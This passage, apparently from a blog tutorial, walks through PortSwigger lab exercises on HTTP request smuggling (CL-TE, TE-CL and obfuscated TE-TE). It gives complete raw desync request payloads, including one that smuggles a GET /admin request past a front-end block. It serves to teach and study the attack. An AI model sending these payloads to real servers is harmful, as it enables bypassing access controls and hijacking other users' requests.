class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">User            Front           Backend</span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|</span><br><span class="line">|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string">               </span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|</span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line">|<span class="hljs-string">&lt;-A(200)-------</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line">|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string"> * ending B *</span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;--B(200)------</span>|</span><br><span class="line">|<span class="hljs-string">&lt;--B(200)------</span>|<span class="hljs-string">               </span>|</span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>1A + 1/2B means request A + an incomplete query B</li><li>A(X) : means X query is hidden in body of query A</li><li>ending B: the 1st line of query C ends the incomplete header of query B. all others headers are added to the query. C disappears and mix C HTTP credentials with all previous B headers (cookie/bearer token/Host, etc.)</li></ul><p>The whole process is that when we send the above request and  the Front server preferentially processes with CL, it will think the following data which is 6 bytes is the body of request A.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">0\r\n</span></span><br><span class="line"><span class="hljs-attribute">\r\n</span></span><br><span class="line"><span class="hljs-attribute">G</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>This request A will be forwarded to the backend as a complete request, and when the backend server preferentially processes it with TE, it will consider follwing data is a complete request.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 6</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>But the alone letter ‘G’, it will be considered as an incomplete request. So a 1/2 B request will be generated, so it will wait for the arrival of other data at the Backend server buffer to make the 1/2 B spliced into a complete request. When we send the second request, POST will be concatenated behind G, so the HTTP Method will become the GPOST method, which is the echo that we see, the unrecognized HTTP Method GPOST.</p><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>Next we look at the situation of TE-CL. Similarly, we use LAB experiments to deepen our understanding.：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">Lab: HTTP request smuggling, basic TE.CL vulnerability</a></p><blockquote><p>This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding. The front-end server rejects requests that aren’t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>According to the chall, what we want to achieve is still to let the backend receive the GPOST request, and the scenario clearly tells us that it is a TE-CL scenario.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: acde1ffc1f047f9f8007186200ff00fe.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 4</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">12</span></span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>It should be noted here that at the end you need to add two CRLFs to construct chunk data.</p><p></p><figure class="highlight taggerscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br><span class="line"><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Here we can send more than two HTTP request packets, and we can receive the response as shown below.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520139652.png" alt=""></p><p>The process flow is similar to CL-TE. When the Front server processes this request, it will be processed first according to TE. It will consider the above request as a whole and then forward it to the Backend server. When the Backend server processes it according to CL, it will consider that <code>12\r\n</code> is the body of the first request, the following is the second request, so it will respond to GPOST as an unrecognized HTTP Method.</p><h3 id="Two-Identical-Fields-TE"><a href="#Two-Identical-Fields-TE" class="headerlink" title="Two Identical Fields - TE"></a>Two Identical Fields - TE</h3><p>Here we look at the situation where TE exists. Similarly, we use LAB experiments to deepen our understanding:<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">Lab: HTTP request smuggling, obfuscating the TE header</a></p><blockquote><p>This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren’t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>According to the chall, what we want to achieve is still to let the backend receive the GPOST request, and the scenario clearly tells us that it is a TE-TE scenario. In fact, this scenario can also be considered as the processing of the same field. For example, when processing two TE fields, if the second TE field is taken as the parsing standard, and the second field value is abnormal or the parsing error, it may be ignored. TE field, and CL field for parsing. For example, in this LAB, we send the following request twice.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 4</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="hljs-attribute">Transfer-encoding</span>: nothing</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">12</span></span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Here is the same as the previous scenario, you need to add two CRLF at the end.</p><p></p><figure class="highlight taggerscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br><span class="line"><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>We can get the response as shown below.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520132864.png" alt=""></p><p>We can see that two TE fields are used here, and the value of the second TE field is non-standard. Here, Front chooses to process the first TE first. The entire request is a normal request and will be forwarded to the Backend server. The backend server prioritizes the second TE. If the second TE value is abnormal, the CL field will be used for processing. This request will be split into two requests due to the CL field value 4.</p><p>The first request:</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 4</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="hljs-attribute">Transfer-encoding</span>: nothing</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">12</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>The second:</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GPOST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>This sent an unrecognized HTTP Method GPOST request.</p><h2 id="Attack-Surface"><a href="#Attack-Surface" class="headerlink" title="Attack Surface"></a>Attack Surface</h2><p>Above we have introduced several attack methods, let us see what these attack methods can be used for. We will also cooperate with the experimental environment to help understand and reproduce.</p><h3 id="Bypass-Front-end-Security-Controls"><a href="#Bypass-Front-end-Security-Controls" class="headerlink" title="Bypass Front-end Security Controls"></a>Bypass Front-end Security Controls</h3><p>Two experimental environments are provided here. One is CL-TE <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</a>  and the othter is TE-CL <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</a>.The two experiments finally achieved the same goal. Here we randomly choose CL-TE for experiments.</p><blockquote><pre><code>This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.</code></pre></blockquote><p>The architecture is the same, but this time we need to use HTTP Smuggling to obtain admin permissions and delete the carlos user.</p><p>After we generate the LAB, if we directly access <code>/admin</code>, we will find<code>"Path / admin is blocked"</code>. It seems that we cannot access<code>/admin</code> through normal methods. Then we try HTTP Smuggling and send the following data packet twice.</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 28</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /admin HTTP/1.1</span><br></pre></td></tr></tbody></table></figure><p></p><p>The response obtained is as follows.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520132539.png" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmm